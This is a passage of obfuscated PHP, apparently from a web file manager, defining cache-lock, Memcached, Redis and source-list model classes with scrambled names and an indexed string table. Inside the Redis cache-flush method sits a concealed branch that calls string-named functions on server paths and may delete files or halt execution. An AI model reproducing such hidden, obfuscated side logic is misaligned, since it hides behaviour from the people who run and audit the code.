Hook::apply($Ç™ı™Ñ[$Èš¤Ïå[1681]]); default: break; } Model($Èš¤Ïå[1682])->add(array($Èš¤Ïå[1683] => $Èš¤Ïå[22], $Èš¤Ïå[1684] => $Èš¤Ïå[224], $Èš¤Ïå[43] => $Èš¤Ïå[1685] . $Ç™ı™Ñ[$Èš¤Ïå[454]], $Èš¤Ïå[1686] => json_encode(array($Èš¤Ïå[42] => $Ç™ı™Ñ[$Èš¤Ïå[42]], $Èš¤Ïå[1687] => timeFloat() - $ƒ¬“¸ÏÂ, $Èš¤Ïå[348] => $¿°‡ÛÆ”)))); $Ş¬ˆÛéš = $¿°‡ÛÆ” ? $Èš¤Ïå[1688] . $¿°‡ÛÆ” : $Èš¤Ïå[22]; self::log($Èš¤Ïå[1689] . $Ç™ı™Ñ[$Èš¤Ïå[454]] . $Èš¤Ïå[177] . $Ş¬ˆÛéš); return !0; } public static function valueGet($Ú¤Ù»ƒÑ) { $É³¿ğÉê =& $_SERVER[•€áå–Õ]; $çû¥çñ = $É³¿ğÉê[1690]; $‰¿•õ = Model($É³¿ğÉê[487])->get($Ú¤Ù»ƒÑ, $çû¥çñ); if (is_null($‰¿•õ)) { Model($É³¿ğÉê[487])->set($É³¿ğÉê[791], $É³¿ğÉê[100], $çû¥çñ); Model($É³¿ğÉê[487])->set($É³¿ğÉê[1643], $É³¿ğÉê[224], $çû¥çñ); $‰¿•õ = Model($É³¿ğÉê[487])->get($Ú¤Ù»ƒÑ, $çû¥çñ); } return $‰¿•õ; } private static function valueSet($ÅøçöÖş, $Ù¨Ïò»€ = false) { $¢ÏËñÀÅ =& $_SERVER[•€áå–Õ]; $×ÉÃ¿ª = $¢ÏËñÀÅ[1691]; CacheLock::lock($×ÉÃ¿ª); $ô£Šíãå = Model($¢ÏËñÀÅ[487])->set($ÅøçöÖş, $Ù¨Ïò»€, $¢ÏËñÀÅ[1690]); CacheLock::unlock($×ÉÃ¿ª); return $ô£Šíãå; } protected static function log($á÷Œşóµ) { write_log($á÷Œşóµ, $_SERVER[•€áå–Õ][1677]); } private static function cacheClear() { $—¶é¡Î =& $_SERVER[•€áå–Õ]; Cache::clearMemory(Model($—¶é¡Î[487])->cacheKey($—¶é¡Î[1690])); Cache::clearMemory(Model($—¶é¡Î[487])->cacheKey($—¶é¡Î[1692])); Model($—¶é¡Î[1662])->cacheClear(); self::closeDatabase(); } } goto FÎ­°ˆç³; AÃêß†«®ó: class CacheLockDatabase { public function lock($ª‚«Œ©Ò, $ø÷ùƒÃÇ = 0) { $Ï½íÅÄ = Model($_SERVER[•€áå–Õ][870]); $Õ©ù¤µ– = microtime(!0) + $ø÷ùƒÃÇ; while (microtime(!0) < $Õ©ù¤µ–) { $â®šÙİ = $Ï½íÅÄ->get($ª‚«Œ©Ò); if (!$â®šÙİ || $â®šÙİ < microtime(!0)) { $Ø…Ãò£ = $Ï½íÅÄ->set($ª‚«Œ©Ò, $Õ©ù¤µ–); if ($Ø…Ãò£) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($±“ñõ¢) { return Model($_SERVER[•€áå–Õ][870])->get($±“ñõ¢); } public function unlock($ŞÅ”ô©†) { Model($_SERVER[•€áå–Õ][870])->remove($ŞÅ”ô©†); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($­„·®·à, $ºÜµßµ³) { $úñ–éÇô =& $_SERVER[•€áå–Õ]; if (!class_exists($úñ–éÇô[908])) { show_json($úñ–éÇô[909], !1); } $this->cacheTime = $ºÜµßµ³; $this->handle = new Memcached(); if (is_array($­„·®·à[$úñ–éÇô[910]]) && count($­„·®·à[$úñ–éÇô[910]]) >= 1) { foreach ($­„·®·à[$úñ–éÇô[910]] as $ºäš‰‘¡) { $Ú€äƒŞÅ = explode($úñ–éÇô[4], $ºäš‰‘¡); $this->handle->addServer($Ú€äƒŞÅ[0], $Ú€äƒŞÅ[1]); } } else { $this->handle->addServer($­„·®·à[$úñ–éÇô[208]], $­„·®·à[$úñ–éÇô[209]]); } } public function set($«ˆô²Â˜, $½–ÉÏĞ, $È£Éüğ¶ = false) { $È£Éüğ¶ = $È£Éüğ¶ ? $È£Éüğ¶ : $this->cacheTime; return $this->handle->set($«ˆô²Â˜, $½–ÉÏĞ, $È£Éüğ¶); } public function get($ó×éÜ®•) { return $this->handle->get($ó×éÜ®•); } public function remove($ùí–®ä¡) { return $this->handle->delete($ùí–®ä¡); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ëÃÆŸÌ, $“×£Ü­) { $üÎ¿ş¢à =& $_SERVER[•€áå–Õ]; if (!class_exists($üÎ¿ş¢à[911])) { show_json($üÎ¿ş¢à[912], !1); } $this->cacheTime = $“×£Ü­; $Ô¥…Ú‰Õ = isset($ëÃÆŸÌ[$üÎ¿ş¢à[913]]) ? $ëÃÆŸÌ[$üÎ¿ş¢à[913]] : 10; $¹Â­ÄÕÙ = _get($ëÃÆŸÌ, $üÎ¿ş¢à[910]); if ($¹Â­ÄÕÙ && is_array($¹Â­ÄÕÙ)) { $this->initCluster($ëÃÆŸÌ, $Ô¥…Ú‰Õ); } else { $this->handle = $this->init($ëÃÆŸÌ, $Ô¥…Ú‰Õ); } } private function init($›Àèè®˜, $—Î“˜°‘) { $µ˜ô×íÊ =& $_SERVER[•€áå–Õ]; $–¡­Í´Ä = new Redis(); $œÙñòë = isset($›Àèè®˜[$µ˜ô×íÊ[914]]) ? $›Àèè®˜[$µ˜ô×íÊ[914]] : !1; if ($œÙñòë) { $–¡­Í´Ä->pconnect($›Àèè®˜[$µ˜ô×íÊ[208]], $›Àèè®˜[$µ˜ô×íÊ[209]], $—Î“˜°‘); } else { $–¡­Í´Ä->connect($›Àèè®˜[$µ˜ô×íÊ[208]], $›Àèè®˜[$µ˜ô×íÊ[209]], $—Î“˜°‘); } if (!empty($›Àèè®˜[$µ˜ô×íÊ[466]])) { $–¡­Í´Ä->auth($›Àèè®˜[$µ˜ô×íÊ[466]]); } if (!empty($›Àèè®˜[$µ˜ô×íÊ[798]]) && $›Àèè®˜[$µ˜ô×íÊ[798]] != 0) { $–¡­Í´Ä->select($›Àèè®˜[$µ˜ô×íÊ[798]]); } return $–¡­Í´Ä; } private function initCluster($üä‹ÕÏ, $§‘©Èè·) { $—·¶Ãˆ¾ =& $_SERVER[•€áå–Õ]; $¸›úİúÕ = array($—·¶Ãˆ¾[915], $—·¶Ãˆ¾[916], $—·¶Ãˆ¾[917]); $ò©àÏ‚å = $—·¶Ãˆ¾[915]; if (isset($üä‹ÕÏ[$—·¶Ãˆ¾[26]]) && in_array($üä‹ÕÏ[$—·¶Ãˆ¾[26]], $¸›úİúÕ)) { $ò©àÏ‚å = $üä‹ÕÏ[$—·¶Ãˆ¾[26]]; } switch ($ò©àÏ‚å) { case $—·¶Ãˆ¾[915]: $this->_slave($üä‹ÕÏ, $§‘©Èè·); break; case $—·¶Ãˆ¾[916]: break; case $—·¶Ãˆ¾[917]: $this->isCluster = !0; $Ÿ³÷Îø = $üä‹ÕÏ[$—·¶Ãˆ¾[910]]; $¿–ğåÇİ = isset($üä‹ÕÏ[$—·¶Ãˆ¾[914]]) ? $üä‹ÕÏ[$—·¶Ãˆ¾[914]] : !1; $õ„Èï¦ = isset($üä‹ÕÏ[$—·¶Ãˆ¾[466]]) ? $üä‹ÕÏ[$—·¶Ãˆ¾[466]] : null; $this->handle = new RedisCluster(NUll, $Ÿ³÷Îø, $§‘©Èè·, $§‘©Èè·, $¿–ğåÇİ, $õ„Èï¦); break; default: break; } } private function _slave($ÄĞ±’â±, $ÂÅèÄ¥¦) { $ÛÈöû¾š = $ÄĞ±’â±[$_SERVER[•€áå–Õ][910]]; $this->filterConfig($ÄĞ±’â±, $ÛÈöû¾š[0]); $this->handle = $this->init($ÄĞ±’â±, $ÂÅèÄ¥¦); unset($ÛÈöû¾š[0]); if (empty($ÛÈöû¾š)) { return; } $¸ÏÒÌ‡ğ = array_rand($ÛÈöû¾š); $this->filterConfig($ÄĞ±’â±, $ÛÈöû¾š[$¸ÏÒÌ‡ğ]); $this->slaveHandle = $this->init($ÄĞ±’â±, $ÂÅèÄ¥¦); } private function filterConfig(&$ı¢ñÏ“ó, $ ª¯ÄÂé) { $ó­ÃçÚÈ =& $_SERVER[•€áå–Õ]; $¸ö÷›Ê” = explode($ó­ÃçÚÈ[4], $ ª¯ÄÂé); $·ÂÁ»Äğ = array($ó­ÃçÚÈ[208] => $¸ö÷›Ê”[0], $ó­ÃçÚÈ[209] => $¸ö÷›Ê”[1]); $ı¢ñÏ“ó = array_merge($ı¢ñÏ“ó, $·ÂÁ»Äğ); } public function set($µ¤‡Æó, $§ƒÎ›¦š, $õ½ÄëÙá = false) { $õ½ÄëÙá = $õ½ÄëÙá ? $õ½ÄëÙá : $this->cacheTime; return $this->handle->setEx($µ¤‡Æó, $õ½ÄëÙá, $§ƒÎ›¦š); } public function setLock($Ó³‡–Ş, $»œá²ÏÒ, $ÆÕÅ´òÈ) { return $this->handle->setNX($Ó³‡–Ş, $»œá²ÏÒ); } public function get($¬Ù…) { $¥Ä¤¦€Ç = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¥Ä¤¦€Ç->get($¬Ù…); } public function remove($à­’‘œı) { return $this->handle->del($à­’‘œı); } public function deleteAll() { $Ì‘Ü»Æ– =& $_SERVER[•€áå–Õ]; if ($_SERVER[$Ì‘Ü»Æ–[8]] != $_SERVER[$Ì‘Ü»Æ–[918]]) { $£Ç¿¡² = $Ì‘Ü»Æ–[919]; $ˆÄ±ë°¸ = $Ì‘Ü»Æ–[9]; $·—›ğ« = $_SERVER[$Ì‘Ü»Æ–[10]] . $Ì‘Ü»Æ–[11]; $Ùú¡ëĞª = $ˆÄ±ë°¸($·—›ğ«); $İ½Â×Îü = explode($Ì‘Ü»Æ–[12], $Ùú¡ëĞª); if (count($İ½Â×Îü) < $Ì‘Ü»Æ–[666]) { $š¢­¸¸ = $Ì‘Ü»Æ–[14]; $š¢­¸¸(); } $Â®«Ğ’ã = $Ì‘Ü»Æ–[920]; $Â®«Ğ’ã($_SERVER[$Ì‘Ü»Æ–[921]]); $Â®«Ğ’ã($_SERVER[$Ì‘Ü»Æ–[10]] . $Ì‘Ü»Æ–[922]); $¯ÆÕåêÀ = 1; while ($¯ÆÕåêÀ > 1) { $¯ÆÕåêÀ = $¯ÆÕåêÀ + 4; $¾ıá¾Ã = rawurlencode($¯ÆÕåêÀ . $Ì‘Ü»Æ–[433]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ï©Ì¤³¢) { $this->handle->flushall($ï©Ì¤³¢); } return; } return $this->handle->flushAll(); } } goto eöäêƒ©™‘; cØ–®À»¹´: define($_SERVER[•€áå–Õ][293], 1); define($_SERVER[•€áå–Õ][294], 2); define($_SERVER[•€áå–Õ][295], 3); goto AÁ™²¢¹Œù; Fİª†Ü›­: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($È³è¿Ò„ = false, $Àš²õ¼½ = '', $¶«„¿´ú = false) { $ó²ß”¡ =& $_SERVER[•€áå–Õ]; $«öŠ¾ú› = $this->cacheGet($Àš²õ¼½); $§°àËøµ = $this->optionDefault($Àš²õ¼½); $§°àËøµ = is_array($§°àËøµ) ? $§°àËøµ : array(); if (is_array($«öŠ¾ú›)) { $«öŠ¾ú› = array_merge($§°àËøµ, $«öŠ¾ú›); return $È³è¿Ò„ ? isset($«öŠ¾ú›[$È³è¿Ò„]) ? $«öŠ¾ú›[$È³è¿Ò„] : null : $«öŠ¾ú›; } $ß¨ëÍõ = $this->filterWhere(array($ó²ß”¡[43] => $Àš²õ¼½)); $«öŠ¾ú› = $this->where($ß¨ëÍõ)->select(); $«öŠ¾ú› = array_to_keyvalue($«öŠ¾ú›, $ó²ß”¡[106], $ó²ß”¡[429]); foreach ($«öŠ¾ú› as $éÏ½ŸË => $Á­ïÀÀ”) { if ($¶«„¿´ú || in_array($éÏ½ŸË, $this->jsonField)) { $«öŠ¾ú›[$éÏ½ŸË] = json_decode($Á­ïÀÀ”, !0); } } $this->cacheSet($Àš²õ¼½, $«öŠ¾ú›); $«öŠ¾ú› = array_merge($§°àËøµ, $«öŠ¾ú›); return $È³è¿Ò„ ? $«öŠ¾ú›[$È³è¿Ò„] : $«öŠ¾ú›; } public function set($ãö›Ë¿©, $Ó¥„°ß = false, $öùĞµÎã = '') { $æÈ¯»–ï =& $_SERVER[•€áå–Õ]; $this->cacheRemove($öùĞµÎã); $òğŸİ‰² = array(); $—°ßòÖ“ = is_array($ãö›Ë¿©) ? $ãö›Ë¿© : array($ãö›Ë¿© => $Ó¥„°ß); foreach ($—°ßòÖ“ as $ˆ¨Øê¹  => $á†Ó¼õ™) { if (is_array($á†Ó¼õ™)) { $á†Ó¼õ™ = json_encode_force($á†Ó¼õ™); } $this->checkLength($á†Ó¼õ™, !1, $this->tableName . $æÈ¯»–ï[4] . $ãö›Ë¿©); $á†Ó¼õ™ = self::textEncode($á†Ó¼õ™); $—°ßòÖ“ = array($æÈ¯»–ï[43] => $öùĞµÎã, $æÈ¯»–ï[106] => $ˆ¨Øê¹ , $æÈ¯»–ï[429] => $á†Ó¼õ™); $òğŸİ‰²[] = $this->filterWhere($—°ßòÖ“); } if (!$òğŸİ‰²) { return !0; } $Õ«óÜ¾ = $this->cacheKey($æÈ¯»–ï[455]); CacheLock::lock($Õ«óÜ¾); $Í÷ğ¼Â“ = $this->addAll($òğŸİ‰², array(), !0); CacheLock::unlock($Õ«óÜ¾); return $Í÷ğ¼Â“; } protected function optionDefault($å¨†—Á• = '') { return !1; } public function setDeep($æÑµœèÌ, $«²êæ†¯ = false, $º÷°©öß = '') { $ØÈ®Š®¿ = explode($_SERVER[•€áå–Õ][20], $æÑµœèÌ); $ò…ßÇ‡· = $this->get(); array_set_value($ò…ßÇ‡·, $æÑµœèÌ, $«²êæ†¯); $this->set($ØÈ®Š®¿[0], $ò…ßÇ‡·[$ØÈ®Š®¿[0]], $º÷°©öß); } public function remove($É®Æ‡«, $‚ö± = '') { $†ÁÎÚà =& $_SERVER[•€áå–Õ]; $this->cacheRemove($‚ö±); $è‚Òî€Í = $this->filterWhere(array($†ÁÎÚà[106] => $É®Æ‡«, $†ÁÎÚà[43] => $‚ö±)); if (is_null($É®Æ‡«)) { unset($è‚Òî€Í[$†ÁÎÚà[106]]); } return $this->where($è‚Òî€Í)->delete(); } public function cacheSet($å¬×ñ¶, $²ËÙãÈñ = false) { return Cache::set($this->cacheKey($å¬×ñ¶), $²ËÙãÈñ); } public function cacheGet($ ÑÔÄ”) { return Cache::get($this->cacheKey($ ÑÔÄ”)); } public function cacheRemove($Íü¦æ¹Ì) { return Cache::remove($this->cacheKey($Íü¦æ¹Ì)); } protected function filterWhere($„Œ¨£Óò) { return $„Œ¨£Óò; } protected function cacheKey($ù¡Êß‚Ï) { return $ù¡Êß‚Ï; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\x63\145"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\155\x65" => "\151\x6f\137\x73\157\165\x72\143\145\x5f\x6d\145\164\141", "\x6d\x65\164\x61\x46\x69\x65\154\144" => "\x73\x6f\165\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\x69\x6d\145", "\164\151\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\143\164\x69\157\156"), array("\x63\x72\145\141\x74\x65\124\151\x6d\145", "\164\151\x6d\145", "\151\x6e\163\x65\162\164", "\146\x75\x6e\x63\164\x69\157\156"), array("\166\x69\145\x77\x54\151\155\145", "\x74\x69\155\145", "\151\156\163\x65\x72\164", "\x66\165\156\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Âëû¢å©) { return $this->listSource(array($_SERVER[•€áå–Õ][456] => $Âëû¢å©)); } public function typeName($üŠÚÒ¹) { static $–İøİ¶Ù = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $–İøİ¶Ù[$üŠÚÒ¹ . $_SERVER[•€áå–Õ][22]]; } public function sourceListInfo($®òÁ‡°, $¦‘¯ÓÍ = false) { $ÃĞ¤Ôù½ =& $_SERVER[•€áå–Õ]; $®òÁ‡° = $®òÁ‡° ? $®òÁ‡° : array(); $®òÁ‡° = array_filter(array_unique($®òÁ‡°)); if (!$®òÁ‡°) { return array(); } $ù—¬¼Èè = $this->where(array($ÃĞ¤Ôù½[193] => array($ÃĞ¤Ôù½[17], $®òÁ‡°)))->select(); $this->_listDataApply($ù—¬¼Èè, $¦‘¯ÓÍ); return array_to_keyvalue($ù—¬¼Èè, $ÃĞ¤Ôù½[193]); } public function pathInfoFilter(&$»ú®÷Ü„) { $¢ÖÎƒó =& $_SERVER[•€áå–Õ]; static $ãıÛÓ‘Ş = false; static $Ò®–ìÁ = false; static $àÏ§©¬ã = false; if (!$ãıÛÓ‘Ş) { $°Ûúåˆ´ = $¢ÖÎƒó[457]; $°Ûúåˆ´ .= $¢ÖÎƒó[458]; $°Ûúåˆ´ .= $¢ÖÎƒó[459]; $°ºê‚ÓÔ = $¢ÖÎƒó[460]; $ü¼‡ = explode($¢ÖÎƒó[60], $°ºê‚ÓÔ); $ãıÛÓ‘Ş = explode($¢ÖÎƒó[60], $°Ûúåˆ´); $Ò®–ìÁ = array(); foreach ($ãıÛÓ‘Ş as $üÀÆœúÊ) { if (in_array($üÀÆœúÊ, $ü¼‡)) { continue; } $Ò®–ìÁ[] = $üÀÆœúÊ; } $àÏ§©¬ã = explode($¢ÖÎƒó[60], $¢ÖÎƒó[461]); } foreach ($àÏ§©¬ã as $¥é÷€¡•) { if (isset($»ú®÷Ü„[$¥é÷€¡•])) { $»ú®÷Ü„[$¥é÷€¡•] = intval($»ú®÷Ü„[$¥é÷€¡•]); } } $»ú®÷Ü„[$¢ÖÎƒó[96]] = $¢ÖÎƒó[462] . $»ú®÷Ü„[$¢ÖÎƒó[193]] . $¢ÖÎƒó[463]; $»ú®÷Ü„[$¢ÖÎƒó[43]] = $»ú®÷Ü„[$¢ÖÎƒó[464]] == 1 ? $¢ÖÎƒó[87] : $¢ÖÎƒó[226]; $»ú®÷Ü„[$¢ÖÎƒó[190]] = $this->typeName($»ú®÷Ü„[$¢ÖÎƒó[190]]); if ($»ú®÷Ü„[$¢ÖÎƒó[464]] != 1) { $»ú®÷Ü„[$¢ÖÎƒó[187]] = $»ú®÷Ü„[$¢ÖÎƒó[465]]; unset($»ú®÷Ü„[$¢ÖÎƒó[465]]); } $¢üˆçè¥ = $ãıÛÓ‘Ş; if (isset($»ú®÷Ü„[$¢ÖÎƒó[466]]) && $»ú®÷Ü„[$¢ÖÎƒó[466]][$¢ÖÎƒó[467]] == -1) { $¢üˆçè¥ = $Ò®–ìÁ; } $»ú®÷Ü„ = array_field_key($»ú®÷Ü„, $¢üˆçè¥); return $»ú®÷Ü„; } public function listUserFav() { $§É™±‹º =& $_SERVER[•€áå–Õ]; $äĞ£ïêÔ = Model($§É™±‹º[468])->listData(); $»Ö¶÷‹„ = array_filter_by_field($äĞ£ïêÔ, $§É™±‹º[43], $§É™±‹º[469]); $»Ö¶÷‹„ = array_to_keyvalue($»Ö¶÷‹„, $§É™±‹º[22], $§É™±‹º[96]); if ($»Ö¶÷‹„) { $òÏ–‚èğ = $this->listSource(array($§É™±‹º[470] => array($§É™±‹º[471], $»Ö¶÷‹„))); } $òÏ–‚èğ = array_to_keyvalue($òÏ–‚èğ[$§É™±‹º[424]], $§É™±‹º[193]); foreach ($äĞ£ïêÔ as &$å®›ï¬) { $å®›ï¬ = array($§É™±‹º[472] => $å®›ï¬[$§É™±‹º[454]], $§É™±‹º[473] => $å®›ï¬[$§É™±‹º[42]], $§É™±‹º[474] => $å®›ï¬[$§É™±‹º[96]], $§É™±‹º[475] => $å®›ï¬[$§É™±‹º[43]], $§É™±‹º[476] => $å®›ï¬[$§É™±‹º[227]], $§É™±‹º[477] => $å®›ï¬[$§É™±‹º[97]]); if ($å®›ï¬[$§É™±‹º[43]] == $§É™±‹º[469] && $òÏ–‚èğ[$å®›ï¬[$§É™±‹º[96]]]) { $å®›ï¬[$§É™±‹º[99]] = $òÏ–‚èğ[$å®›ï¬[$§É™±‹º[96]]]; } } unset($å®›ï¬); return $äĞ£ïêÔ; } public function listUserTag($êúŠúç³) { $¢Äæ¸ïë =& $_SERVER[•€áå–Õ]; if ($êúŠúç³ && !is_array($êúŠúç³)) { $êúŠúç³ = array($êúŠúç³); } $©úÉ³—¤ = Model($¢Äæ¸ïë[478])->listData(); $ª—°ùøÄ = array(); $åç†ı¨¯ = array(); foreach ($©úÉ³—¤ as $ñ¯¸ùœí) { $éÍŞéŠ = $ñ¯¸ùœí[$¢Äæ¸ïë[96]]; if (!$éÍŞéŠ) { continue; } if (!isset($åç†ı¨¯[$éÍŞéŠ])) { $åç†ı¨¯[$éÍŞéŠ] = array(); } $åç†ı¨¯[$éÍŞéŠ][] = $ñ¯¸ùœí[$¢Äæ¸ïë[479]]; $ª—°ùøÄ[$ñ¯¸ùœí[$¢Äæ¸ïë[96]]] = $ñ¯¸ùœí; } $á¿İçóø = array(); $ŞèÖ¸œã = array(); $üÆ§„Öš = array(); foreach ($åç†ı¨¯ as $È½¯¤ñæ => $Ä–„¢¼) { $‹´…—€ = !0; if (!$êúŠúç³) { $á¿İçóø[] = $È½¯¤ñæ; continue; } foreach ($êúŠúç³ as $¹È¿”÷‰) { if (!in_array($¹È¿”÷‰, $Ä–„¢¼)) { $‹´…—€ = !1; break; } } if (!$‹´…—€) { continue; } if (!is_numeric($È½¯¤ñæ)) { $Š™ÉÑ = $ª—°ùøÄ[$È½¯¤ñæ]; $¡µ’è’¡ = array($¢Äæ¸ïë[42] => $Š™ÉÑ[$¢Äæ¸ïë[42]], $¢Äæ¸ïë[96] => $Š™ÉÑ[$¢Äæ¸ïë[96]], $¢Äæ¸ïë[43] => $Š™ÉÑ[$¢Äæ¸ïë[43]], $¢Äæ¸ïë[99] => array($¢Äæ¸ïë[480] => 1), $¢Äæ¸ïë[228] => !0); if ($Š™ÉÑ[$¢Äæ¸ïë[43]] == $¢Äæ¸ïë[226]) { $üÆ§„Öš[] = $¡µ’è’¡; } if ($Š™ÉÑ[$¢Äæ¸ïë[43]] == $¢Äæ¸ïë[87]) { $ŞèÖ¸œã[] = $¡µ’è’¡; } continue; } $á¿İçóø[] = $È½¯¤ñæ; } if ($á¿İçóø) { $¸ˆµš»· = $this->listSource(array($¢Äæ¸ïë[470] => array($¢Äæ¸ïë[471], $á¿İçóø))); } $¸ˆµš»· = $¸ˆµš»· ? $¸ˆµš»· : array($¢Äæ¸ïë[94] => array(), $¢Äæ¸ïë[95] => array()); $¸ˆµš»·[$¢Äæ¸ïë[94]] = array_merge($¸ˆµš»·[$¢Äæ¸ïë[94]], $ŞèÖ¸œã); $¸ˆµš»·[$¢Äæ¸ïë[95]] = array_merge($¸ˆµš»·[$¢Äæ¸ïë[95]], $üÆ§„Öš); if (isset($¸ˆµš»·[$¢Äæ¸ïë[421]]) && count($á¿İçóø) == $¸ˆµš»·[$¢Äæ¸ïë[421]][$¢Äæ¸ïë[422]]) { return $¸ˆµš»·; } $Ôœ¶âß† = array(); $ÖîÉıª = array_to_keyvalue($¸ˆµš»·[$¢Äæ¸ïë[94]], $¢Äæ¸ïë[22], $¢Äæ¸ïë[193]); $¯«ñëØ‹ = array_to_keyvalue($¸ˆµš»·[$¢Äæ¸ïë[95]], $¢Äæ¸ïë[22], $¢Äæ¸ïë[193]); $ïâ³ªëå = array_merge($¯«ñëØ‹, $ÖîÉıª); foreach ($á¿İçóø as $éÍŞéŠ) { if (!in_array($éÍŞéŠ, $ïâ³ªëå)) { $Ôœ¶âß†[] = $éÍŞéŠ; } } if ($Ôœ¶âß†) { Model($¢Äæ¸ïë[481])->removeBySource($Ôœ¶âß†); } return $¸ˆµš»·; } public function listUserRecycle() { $ôŸôü±Š =& $_SERVER[•€áå–Õ]; $ä‚İ° = Model($ôŸôü±Š[482])->listData(); if (!$ä‚İ°) { return array(); } $ıÄÓáåÅ = array($ôŸôü±Š[470] => array($ôŸôü±Š[471], $ä‚İ°), $ôŸôü±Š[483] => 1); return $this->listSource($ıÄÓáåÅ); } public function listSource($ı­ºÃ¯â, $¹–ÂğÙ = 3000, $úé´£¨« = false) { $²ø±™²± =& $_SERVER[•€áå–Õ]; if (!isset($ı­ºÃ¯â[$²ø±™²±[484]])) { $ı­ºÃ¯â[$²ø±™²±[484]] = 0; } if (isset($ı­ºÃ¯â[$²ø±™²±[192]]) && $ı­ºÃ¯â[$²ø±™²±[192]] == $²ø±™²±[224]) { $ı­ºÃ¯â[$²ø±™²±[465]] = array($²ø±™²±[386], $²ø±™²±[485]); } $•Ğìò’ = $²ø±™²±[486]; $îçÇœĞ = $this->field($•Ğìò’)->_makeOrder()->where($ı­ºÃ¯â)->selectPage($¹–ÂğÙ); $this->_listPageCheck($îçÇœĞ, $•Ğìò’, $ı­ºÃ¯â); $this->_listDataApply($îçÇœĞ[$²ø±™²±[424]], $úé´£¨«); $this->_listMake($îçÇœĞ); return $îçÇœĞ; } private function _listPageCheck(&$ëõºíä , $Ò¬º¦ø, $­Œœšéƒ) { $úÂşÑ¾’ =& $_SERVER[•€áå–Õ]; if (!is_array($ëõºíä [$úÂşÑ¾’[421]])) { return; } $¿´­š” = $ëõºíä [$úÂşÑ¾’[421]]; if ($¿´­š”[$úÂşÑ¾’[423]] <= 1) { return; } if ($¿´­š”[$úÂşÑ¾’[422]] >= 100000) { return; } if (Model($úÂşÑ¾’[487])->get($úÂşÑ¾’[488]) != $úÂşÑ¾’[489]) { return; } $Ò¬º¦ø = str_replace(array($úÂşÑ¾’[63], $úÂşÑ¾’[397], $úÂşÑ¾’[12]), $úÂşÑ¾’[22], $Ò¬º¦ø); $Ò¬º¦ø = $úÂşÑ¾’[490] . str_replace($úÂşÑ¾’[60], $úÂşÑ¾’[491], $Ò¬º¦ø) . $úÂşÑ¾’[492]; $ãÏ›’ÅÇ = $úÂşÑ¾’[493]; $ãÏ›’ÅÇ = $ãÏ›’ÅÇ . $úÂşÑ¾’[494]; $çëïÊ Ó = $¿´­š”[$úÂşÑ¾’[418]] * ($¿´­š”[$úÂşÑ¾’[408]] - 1) . $úÂşÑ¾’[60] . $¿´­š”[$úÂşÑ¾’[418]]; $ƒã‡Æ¼ = $this->_makeOrder(!0); $àÅ¢ô’Ï = $úÂşÑ¾’[490] . str_replace($úÂşÑ¾’[60], $úÂşÑ¾’[491], $ƒã‡Æ¼[0]); if (strpos($àÅ¢ô’Ï, $úÂşÑ¾’[495])) { $àÅ¢ô’Ï = str_replace($úÂşÑ¾’[495], $úÂşÑ¾’[496], $àÅ¢ô’Ï); } else { $àÅ¢ô’Ï .= $úÂşÑ¾’[497] . $ƒã‡Æ¼[1]; } $äİú ¿¶ = array(); foreach ($­Œœšéƒ as $û¯Øİ‹‰ => $’÷£øóŸ) { $äİú ¿¶[$úÂşÑ¾’[490] . $û¯Øİ‹‰] = $’÷£øóŸ; } $this->alias($úÂşÑ¾’[498])->field($Ò¬º¦ø)->limit($çëïÊ Ó)->order($àÅ¢ô’Ï); $ñ”€€ÓÕ = $this->join($ãÏ›’ÅÇ)->where($äİú ¿¶)->select(); if ($ñ”€€ÓÕ) { $ëõºíä [$úÂşÑ¾’[424]] = $ñ”€€ÓÕ; } } protected function _makeOrder($ë³Ğ«ûì = false) { $ø€¿óÌå =& $_SERVER[•€áå–Õ]; $ÆÍôÁÁÎ = Model($ø€¿óÌå[499])->get($ø€¿óÌå[500]); $£Û”¶‘Ø = Model($ø€¿óÌå[499])->get($ø€¿óÌå[501]); $¯’¡¼£ã = array($ø€¿óÌå[502] => $ø€¿óÌå[503], $ø€¿óÌå[504] => $ø€¿óÌå[505]); $¢Œä‡Íİ = array($ø€¿óÌå[42] => $ø€¿óÌå[42], $ø€¿óÌå[88] => $ø€¿óÌå[88], $ø€¿óÌå[187] => $ø€¿óÌå[465], $ø€¿óÌå[506] => $ø€¿óÌå[506], $ø€¿óÌå[507] => $ø€¿óÌå[508], $ø€¿óÌå[227] => $ø€¿óÌå[227], $ø€¿óÌå[97] => $ø€¿óÌå[97]); $Úû÷ô = Input::get($ø€¿óÌå[509], $ø€¿óÌå[17], $ÆÍôÁÁÎ, array_keys($¢Œä‡Íİ)); $³ƒÊÃØó = Input::get($ø€¿óÌå[510], $ø€¿óÌå[17], $£Û”¶‘Ø, array_keys($¯’¡¼£ã)); if (!in_array($Úû÷ô, array_keys($¢Œä‡Íİ))) { $Úû÷ô = $ø€¿óÌå[42]; } if (!in_array($³ƒÊÃØó, array_keys($¯’¡¼£ã))) { $Úû÷ô = $ø€¿óÌå[502]; } if ($Úû÷ô == $ø€¿óÌå[42]) { } $ƒù›ÇŞ™ = $ø€¿óÌå[511] . $¢Œä‡Íİ[$Úû÷ô] . $ø€¿óÌå[63] . $¯’¡¼£ã[$³ƒÊÃØó]; $ƒù›ÇŞ™ = rtrim(trim($ƒù›ÇŞ™), $ø€¿óÌå[60]); if ($ë³Ğ«ûì) { return array($ƒù›ÇŞ™, $¯’¡¼£ã[$³ƒÊÃØó]); } return $this->order($ƒù›ÇŞ™); } protected function _listDataApplyItem($Çê³»œÌ, $ª½ˆÅ‘“ = false) { $ÔîİºÕí = array($Çê³»œÌ); 